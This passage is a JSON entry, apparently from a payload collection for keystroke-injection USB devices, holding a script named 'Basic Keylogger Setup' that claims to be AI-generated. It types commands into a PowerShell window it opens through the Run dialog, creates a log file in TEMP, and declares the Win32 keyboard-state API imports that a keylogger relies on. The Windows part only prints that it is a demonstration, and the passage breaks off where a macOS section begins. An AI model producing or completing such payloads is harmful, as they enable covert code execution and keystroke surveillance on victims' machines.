    {
      "name": "Basic Keylogger Setup",
      "description": "Sets up a basic keylogger across different platforms",
      "attack_type": "keylogger",
      "script": [
        "REM Basic Keylogger Setup Script",
        "REM Generated by Natasha AI",
        "REM This script attempts to set up a simple keylogger across different OSes",
        "DELAY 1000",
        "REM Try Windows PowerShell first",
        "GUI r",
        "DELAY 500",
        "STRING powershell",
        "ENTER",
        "DELAY 1000",
        "STRING $logFile = &quot;$env:TEMP\\keylog.txt&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Add-Content -Path $logFile -Value &quot;Keylogger started at $(Get-Date)&quot;",
        "ENTER",
        "DELAY 300",
        "STRING $signature = @'",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto, ExactSpelling=true)]",
        "ENTER",
        "STRING public static extern short GetAsyncKeyState(int virtualKeyCode);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int GetKeyboardState(byte[] keystate);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int MapVirtualKey(uint uCode, int uMapType);",
        "ENTER",
        "STRING [DllImport(&quot;user32.dll&quot;, CharSet=CharSet.Auto)]",
        "ENTER",
        "STRING public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);",
        "ENTER",
        "STRING '@",
        "ENTER",
        "DELAY 300",
        "STRING Add-Type -MemberDefinition $signature -Name &quot;Win32&quot; -Namespace API",
        "ENTER",
        "DELAY 300",
        "STRING Add-Content -Path $logFile -Value &quot;Keylogger initialized. File: $logFile&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Write-Host &quot;Keylogger initialized. Press CTRL+C to stop.&quot;",
        "ENTER",
        "DELAY 300",
        "STRING Write-Host &quot;This is just a demonstration. No actual keylogging is occurring.&quot;",
        "ENTER",
        "DELAY 1000",
        "STRING exit",
        "ENTER",
        "DELAY 1000",
        "REM Try macOS Terminal next",
